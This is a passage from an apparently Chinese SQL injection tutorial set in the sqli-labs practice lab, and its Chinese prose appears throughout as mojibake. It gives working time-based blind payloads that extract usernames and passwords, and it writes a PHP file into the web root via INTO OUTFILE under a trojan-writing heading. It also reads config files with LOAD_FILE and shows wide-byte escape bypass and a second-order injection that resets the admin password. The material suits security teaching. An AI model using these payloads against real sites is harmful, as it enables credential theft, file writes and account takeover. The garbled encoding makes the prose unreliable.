<p>?id&#x3D;<code>1&#39;and if(1=1,sleep(5),0)--+ </code>?id&#x3D;<code>1&#39;and if(1=2,sleep(5),0)--+</code></p>
</blockquote>
<p>å¯ä»¥æ˜æ˜¾è§‚å¯Ÿåˆ°é¡µé¢çš„å“åº”æ—¶é—´ä¸åŒï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°±å¯ä»¥æ ¹æ®å“åº”æ—¶é•¿ï¼Œåˆ¤æ–­å¸ƒå°”è¡¨è¾¾å¼æ˜¯å¦æ­£ç¡®</p>
<h3 id="1ã€åˆ¤æ–­é—­åˆ-3"><a href="#1ã€åˆ¤æ–­é—­åˆ-3" class="headerlink" title="1ã€åˆ¤æ–­é—­åˆ"></a>1ã€åˆ¤æ–­é—­åˆ</h3><blockquote>
<p>?id&#x3D;<code>1&#39;and if(1=1,sleep(5),0)--+</code></p>
</blockquote>
<p>å°†å•å¼•å·æ›¿æ¢ä¸ºå…¶ä»–ç¬¦å·è¿›è¡Œæµ‹è¯•ï¼Œå‡ºç°å»¶è¿Ÿçš„ç¬¦å·å³ä¸ºæ­£ç¡®çš„ç¬¦å·</p>
<h3 id="2ã€åˆ¤æ–­æ•°æ®åº“"><a href="#2ã€åˆ¤æ–­æ•°æ®åº“" class="headerlink" title="2ã€åˆ¤æ–­æ•°æ®åº“"></a>2ã€åˆ¤æ–­æ•°æ®åº“</h3><p>ä½¿ç”¨<code>limit</code>å…³é”®å­—æ¥é™åˆ¶è¾“å‡º</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ä¸å¸ƒå°”ç±»å‹æ³¨å…¥åŸºæœ¬ç›¸åŒï¼Œä½†æ˜¯ä½¿ç”¨<code>ifè¯­å¥</code>æ¥è¿›è¡Œåˆ¤æ–­</p>
<blockquote>
<p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),1) LIKE &#39;s&#39;),sleep(5),0)--+</code></p>
</blockquote>
<h3 id="3ã€åˆ¤æ–­è¡¨å"><a href="#3ã€åˆ¤æ–­è¡¨å" class="headerlink" title="3ã€åˆ¤æ–­è¡¨å"></a>3ã€åˆ¤æ–­è¡¨å</h3><p>æŸ¥è¯¢æ•°æ®åº“securityä¸­çš„è¡¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>

<p>åˆ¤æ–­è¡¨å</p>
<blockquote>
<p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1),1)=&#39;e&#39;),sleep(5),0)--+</code></p>
</blockquote>
<p>ä¸æ–­æ¨æµ‹å‡ºå…¶ä»–çš„è¡¨å</p>
<h3 id="4ã€åˆ¤æ–­åˆ—å"><a href="#4ã€åˆ¤æ–­åˆ—å" class="headerlink" title="4ã€åˆ¤æ–­åˆ—å"></a>4ã€åˆ¤æ–­åˆ—å</h3><p>æŸ¥è¯¢security.usersè¡¨ä¸­çš„å­—æ®µ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 0,1),1)=&#39;i&#39;),sleep(5),0)--+</code></p>
</blockquote>
<h3 id="5ã€çŒœæµ‹æ•°æ®"><a href="#5ã€çŒœæµ‹æ•°æ®" class="headerlink" title="5ã€çŒœæµ‹æ•°æ®"></a>5ã€çŒœæµ‹æ•°æ®</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,username,password) <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>

<blockquote>
<p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT username from security.users LIMIT 0,1),1)=&#39;d&#39;),sleep(5),0)--+ </code>?id&#x3D;<code>1&#39;and if((LEFT((SELECT concat_ws(&#39;:&#39;,username,password) from security.users LIMIT 0,1),9)=&#39;dumb:dumb&#39;),sleep(5),0)--+ </code>?id&#x3D;<code>1&#39;and if((LEFT((SELECT GROUP_CONCAT(username,&#39;:&#39;,password) from security.users),14)=&#39;dumb:dumb,ange&#39;),sleep(5),0)--+</code></p>
</blockquote>
<h2 id="åã€æ³¨å…¥è„šæœ¬ç¼–å†™"><a href="#åã€æ³¨å…¥è„šæœ¬ç¼–å†™" class="headerlink" title="åã€æ³¨å…¥è„šæœ¬ç¼–å†™"></a>åã€æ³¨å…¥è„šæœ¬ç¼–å†™</h2><p>ç›²æ³¨ä¸è”åˆæ³¨å…¥å’ŒæŠ¥é”™æ³¨å…¥ä¸åŒï¼Œç›²æ³¨éœ€è¦é€å­—ç¬¦çš„å»ä¸æ–­çŒœæµ‹ï¼Œå¦‚æœå•çº¯ä½¿ç”¨æ‰‹å·¥æ³¨å…¥çš„è¯ï¼Œå°±éœ€è¦å¤§é‡çš„æ—¶é—´</p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨è„šæœ¬è¿›è¡Œæ‰¹é‡çš„æ³¨å…¥</p>
<h3 id="1ã€å¸ƒå°”ç›²æ³¨è„šæœ¬"><a href="#1ã€å¸ƒå°”ç›²æ³¨è„šæœ¬" class="headerlink" title="1ã€å¸ƒå°”ç›²æ³¨è„šæœ¬"></a>1ã€å¸ƒå°”ç›²æ³¨è„šæœ¬</h3><h3 id="2ã€æ—¶é—´ç›²æ³¨è„šæœ¬"><a href="#2ã€æ—¶é—´ç›²æ³¨è„šæœ¬" class="headerlink" title="2ã€æ—¶é—´ç›²æ³¨è„šæœ¬"></a>2ã€æ—¶é—´ç›²æ³¨è„šæœ¬</h3><h2 id="åä¸€ã€æ³¨å…¥å†™é©¬ä¸æ–‡ä»¶è¯»å–"><a href="#åä¸€ã€æ³¨å…¥å†™é©¬ä¸æ–‡ä»¶è¯»å–" class="headerlink" title="åä¸€ã€æ³¨å…¥å†™é©¬ä¸æ–‡ä»¶è¯»å–"></a>åä¸€ã€æ³¨å…¥å†™é©¬ä¸æ–‡ä»¶è¯»å–</h2><h3 id="1ã€å…ˆå†³æ¡ä»¶"><a href="#1ã€å…ˆå†³æ¡ä»¶" class="headerlink" title="1ã€å…ˆå†³æ¡ä»¶"></a>1ã€å…ˆå†³æ¡ä»¶</h3><ul>
<li>å½“å‰ç”¨æˆ·ä¸º<code>rootæƒé™</code>æˆ–å…·æœ‰<code>FILEæƒé™</code>ï¼Œä½¿ç”¨è¯­å¥è¿›è¡ŒæŸ¥è¯¢</li>
<li><code>secure_file_priv=&#39;â€™</code></li>
<li>è¦å†™å…¥çš„ç›®å½•éœ€è¦å…·æœ‰<code>å†™æƒé™</code></li>
<li>è·å–å½“å‰ç½‘ç«™ç»å¯¹è·¯å¾„ï¼Œç»å¯¹è·¯å¾„å¯ä»¥é€šè¿‡ç½‘ç«™çš„å„ç§ä¿¡æ¯æ³„éœ²æ¥å‘ç°</li>
<li>phpçš„gpcä¸ºoffçŠ¶æ€ï¼Œè‹¥åœ¨å¼€å¯gpcçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡åå…­è¿›åˆ¶çš„è·¯å¾„è¯»å†™æ–‡ä»¶</li>
</ul>
<p>æŸ¥è¯¢å½“å‰ç”¨æˆ·æƒé™</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> file_priv,<span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> file_priv <span class="operator">|</span> <span class="keyword">user</span>          <span class="operator">|</span> host      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> Y         <span class="operator">|</span> root          <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> N         <span class="operator">|</span> mysql.session <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> N         <span class="operator">|</span> mysql.sys     <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> N         <span class="operator">|</span> dvwa          <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Y         <span class="operator">|</span> root          <span class="operator">|</span> <span class="operator">%</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-----------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢<code>secure_file_priv</code> çš„å€¼</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> @<span class="variable">@secure</span>_file_priv;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> @<span class="variable">@secure</span>_file_priv <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"># secure_file_priv çš„å€¼æœ‰ä¸‰ç§æƒ…å†µ</span><br><span class="line"><span class="number">1.</span> ç©º      é‚£ä¹ˆå¯¹æ‰€æœ‰è·¯å¾„å‡å¯è¿›è¡Œå¯¼å…¥å¯¼å‡ºã€‚</span><br><span class="line"><span class="number">2.</span> ç›®å½•    é‚£ä¹ˆåªå…è®¸åœ¨è¯¥è·¯å¾„ä¸‹å¯¼å…¥å¯¼å‡ºã€‚</span><br><span class="line"><span class="number">3.</span> <span class="keyword">Null</span>   é‚£ä¹ˆç¦æ­¢æ‰€æœ‰å¯¼å…¥å¯¼å‡ºã€‚</span><br></pre></td></tr></table></figure>

<aside>

<p>ğŸ’¡ åœ¨<code>mysql 5.6.34</code>ç‰ˆæœ¬ä»¥å <code>secure_file_priv</code>çš„å€¼é»˜è®¤ä¸º<code>NULL</code></p>
</aside>

<h3 id="2ã€å†™å…¥æœ¨é©¬"><a href="#2ã€å†™å…¥æœ¨é©¬" class="headerlink" title="2ã€å†™å…¥æœ¨é©¬"></a>2ã€å†™å…¥æœ¨é©¬</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;? phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/ phpstudy_pro/WWW/phpinfo.php&#x27;</span>  # phpinfo()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>â€˜ into outfile â€˜C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;phpinfo.phpâ€™â€“+&#96;</p>
</blockquote>
<p>è‹¥æç¤ºå¦‚ä¸‹é”™è¯¯ï¼Œåˆ™è¡¨æ˜å½“å‰çš„æ–‡ä»¶å¤¹æ²¡æœ‰æƒé™è¿›è¡Œä¸Šä¼ </p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/89bdfd14-818d-44bf-8490-637f4d0199b4/Untitled.png" alt="Untitled"></p>
<aside>

<p>ğŸ’¡ windowsä¸‹ï¼šä¿®æ”¹<code>my.ini</code> åœ¨<code>[mysqld]</code>å†…åŠ å…¥<code>secure_file_priv =</code></p>
<p>linuxä¸‹ï¼šä¿®æ”¹<code>my.cnf</code>åœ¨<code>[mysqld]</code>å†…åŠ å…¥<code>secure_file_priv =</code></p>
<p>ç„¶åé‡å¯mysqlï¼Œå†æŸ¥è¯¢<code>secure_file_priv</code></p>
</aside>

<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a7bc4f6c-3ef5-4df5-ace0-0e21be7b92a1/Untitled.png" alt="Untitled"></p>
<h3 id="3ã€è¯»å–æ–‡ä»¶"><a href="#3ã€è¯»å–æ–‡ä»¶" class="headerlink" title="3ã€è¯»å–æ–‡ä»¶"></a>3ã€è¯»å–æ–‡ä»¶</h3><p>è¯»å–æ–‡ä»¶ä½¿ç”¨çš„<code>load_file()</code> ,æ‹¬å·å†…ä¼ å…¥æ–‡ä»¶è·¯å¾„ã€‚æ–‡ä»¶è·¯å¾„å¿…é¡»æ˜¯<code>/</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> LOAD_FILE(<span class="string">&#x27;C:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini&#x27;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union select 1,LOAD_FILE(&#39;C:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini&#39;)--+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a5fbaf70-a1cc-4fce-95c8-d25c4c63e39b/Untitled.png" alt="Untitled"></p>
<h2 id="åä¸€ã€å®½å­—èŠ‚æ³¨å…¥"><a href="#åä¸€ã€å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="åä¸€ã€å®½å­—èŠ‚æ³¨å…¥"></a>åä¸€ã€å®½å­—èŠ‚æ³¨å…¥</h2><p>å®½å­—èŠ‚æ˜¯ç›¸å¯¹äºascIIè¿™æ ·å•å­—èŠ‚è€Œè¨€çš„ï¼ŒåƒGB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JISç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚</p>
<p>GBKæ˜¯ä¸€ç§å¤šå­—ç¬¦çš„ç¼–ç ï¼Œé€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªgbkç¼–ç æ±‰å­—ï¼Œå ç”¨2ä¸ªå­—èŠ‚ã€‚ä¸€ä¸ªutf-8ç¼–ç çš„æ±‰å­—ï¼Œå ç”¨3ä¸ªå­—èŠ‚</p>
<p>è½¬ä¹‰å‡½æ•°ï¼šä¸ºäº†è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„ä¸€äº›æ•°æ®ï¼Œå¯¹ç‰¹æ®Šçš„å­—ç¬¦åŠ ä¸Šåæ–œæ â€œ\â€è¿›è¡Œè½¬ä¹‰ï¼›Mysqlä¸­è½¬ä¹‰çš„å‡½æ•°addslashesï¼Œmysql_real_escape_stringï¼Œmysql_escape_stringç­‰ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é…ç½®magic_quote_gpcï¼Œä¸è¿‡PHPé«˜ç‰ˆæœ¬å·²ç»ç§»é™¤æ­¤åŠŸèƒ½</p>
<p>å®½å­—èŠ‚æ³¨å…¥æŒ‡çš„æ˜¯mysqlæ•°æ®åº“åœ¨ä½¿ç”¨å®½å­—èŠ‚ï¼ˆGBKï¼‰ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç è¦å¤§äº128ï¼ˆæ¯”å¦‚<code>%df</code>ï¼‰ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ï¼Œè€Œä¸”å½“æˆ‘ä»¬è¾“å…¥å•å¼•å·æ—¶ï¼Œmysqlä¼šè°ƒç”¨è½¬ä¹‰å‡½æ•°ï¼Œå°†å•å¼•å·å˜ä¸º<code>\&#39;</code>ï¼Œå…¶ä¸­<code>\</code>çš„åå…­è¿›åˆ¶æ˜¯<code>%5c</code>,mysqlçš„GBKç¼–ç ï¼Œä¼šè®¤ä¸º<code>%df%5c</code>æ˜¯ä¸€ä¸ªå®½å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯<code>&#39;é‹&#39;</code>ï¼Œä»è€Œä½¿å•å¼•å·é—­åˆï¼ˆé€ƒé€¸ï¼‰ï¼Œè¿›è¡Œæ³¨å…¥æ”»å‡»</p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-32/">http://10.211.55.6/sqli-labs/Less-32/</a></p>
<h3 id="1ã€æ³¨å…¥å°è¯•"><a href="#1ã€æ³¨å…¥å°è¯•" class="headerlink" title="1ã€æ³¨å…¥å°è¯•"></a>1ã€æ³¨å…¥å°è¯•</h3><p>è¾“å…¥å•å¼•å·</p>
<blockquote>
<p>?id&#x3D;1%dfâ€™</p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/17b06b01-922a-4df3-85d5-d43c7f966f46/Untitled.png" alt="Untitled"></p>
<p>é¡µé¢æ— æŠ¥é”™</p>
<blockquote>
<p>?id&#x3D;1%dfâ€™</p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/07816e7c-3098-4d2a-adac-aa5eb4ff1d15/Untitled.png" alt="Untitled"></p>
<p>æ­¤æ—¶å•å¼•å·å·²ç»é€ƒé€¸å‡ºæ¥ï¼Œåç»­æ­¥éª¤å’Œä¹‹å‰ç›¸åŒ</p>
<p>è‹¥é‡åˆ°<code>table_name=&#39;users&#39;</code> å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶è¿›è¡Œä»£æ›¿</p>
<h2 id="åäºŒã€äºŒæ¬¡æ³¨å…¥"><a href="#åäºŒã€äºŒæ¬¡æ³¨å…¥" class="headerlink" title="åäºŒã€äºŒæ¬¡æ³¨å…¥"></a>åäºŒã€äºŒæ¬¡æ³¨å…¥</h2><p>äºŒæ¬¡æ³¨å…¥æ˜¯æŒ‡å·²å­˜å‚¨ï¼ˆæ•°æ®åº“ã€æ–‡ä»¶ï¼‰çš„ç”¨æˆ·è¾“å…¥è¢«è¯»å–åå†æ¬¡è¿›å…¥åˆ° SQL æŸ¥è¯¢è¯­å¥ä¸­å¯¼è‡´çš„æ³¨å…¥</p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-24/">http://10.211.55.6/sqli-labs/Less-24/</a></p>
<p>file:&#x2F;&#x2F;Less-24&#x2F;login.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line">  <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨äº†<code>mysql_real_escape_string</code> å‡½æ•°è½¬ä¹‰äº†ä¼ å…¥å­—ç¬¦ä¸²çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¼è‡´æ— æ³•è¿›è¡Œæ³¨å…¥</p>
<p>file:&#x2F;&#x2F;Less-24&#x2F;pass_change.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line">  <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">  <span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">  <span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">  <span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">  &#123;  </span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">      <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åŒæ ·ä½¿ç”¨äº†<code>mysql_real_escape_string</code> å‡½æ•°è½¬ä¹‰</p>
<p>ä½†usernameæ˜¯ç›´æ¥ä»seesionä¸­å–å‡ºçš„ï¼Œå¹¶æœªè¿›è¡Œè½¬ä¹‰å’Œè¿‡æ»¤</p>
<p>è¿™é‡Œå¯ä»¥é€šè¿‡æ§åˆ¶usernameçš„åå­—æ¥è¿›è¡Œæ³¨å…¥</p>
<p>é¦–å…ˆæ³¨å†Œadminâ€™â€“ - è´¦å·ï¼Œå¯†ç ä»»æ„</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95924047-1697-4768-9596-29b36005e662/Untitled.png" alt="Untitled"></p>
<p>è‹¥æ­¤æ—¶å†ä¿®æ”¹å¯†ç ï¼Œåå°è¯­å¥åˆ™å˜ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;-- &#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶adminçš„å¯†ç å°†ä¼šä¿®æ”¹ä¸ºæŒ‡å®šçš„å¯†ç </p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa6d3999-5d4e-43bd-a184-2641f4d482ee/Untitled.png" alt="Untitled"></p>
<p>åŒæ ·ï¼Œå¯ä»¥åˆ©ç”¨è¿™æ³¨å…¥ç‚¹è¿›è¡Œç›²æ³¨çš„åˆ¤æ–­</p>
<blockquote>
<p>adminâ€™ and left(database(),8)&#x3D;â€™securityâ€™â€“ -</p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9c253d4b-4ebc-4959-a7d9-804fb4b866d9/Untitled.png" alt="Untitled"></p>
<h2 id="åä¸‰ã€æ— åˆ—åæ³¨å…¥"><a href="#åä¸‰ã€æ— åˆ—åæ³¨å…¥" class="headerlink" title="åä¸‰ã€æ— åˆ—åæ³¨å…¥"></a>åä¸‰ã€æ— åˆ—åæ³¨å…¥</h2><p>å½“<code>information_schema</code>æˆ–<code>åˆ—å</code>è¢«è¿‡æ»¤æ—¶ï¼Œå°†æ— æ³•ä½¿ç”¨åˆ—æ¥è¿›è¡Œæ•°æ®çš„æŸ¥è¯¢ï¼Œæ­¤æ—¶å¯ä½¿ç”¨æ— åˆ—åæ³¨å…¥</p>
<p>äºŒæ¬¡æ³¨å…¥æ˜¯sqlæ³¨å…¥çš„ä¸€ç§ï¼Œä½†æ˜¯æ¯”æ™®é€šsqlæ³¨å…¥åˆ©ç”¨æ›´åŠ å›°éš¾ï¼Œåˆ©ç”¨é—¨æ§›æ›´é«˜ã€‚æ™®é€šæ³¨å…¥æ•°æ®ç›´æ¥è¿›å…¥åˆ° SQL æŸ¥è¯¢ä¸­ï¼Œè€ŒäºŒæ¬¡æ³¨å…¥åˆ™æ˜¯è¾“å…¥æ•°æ®ç»å¤„ç†åå­˜å‚¨ï¼Œå–å‡ºåï¼Œå†æ¬¡è¿›å…¥åˆ° SQL æŸ¥è¯¢ã€‚</p>
<h3 id="1ã€åŸºæœ¬åŸç†"><a href="#1ã€åŸºæœ¬åŸç†" class="headerlink" title="1ã€åŸºæœ¬åŸç†"></a>1ã€åŸºæœ¬åŸç†</h3><p>è§‚å¯Ÿå¦‚ä¸‹è¯­å¥çš„è¾“å‡º</p>
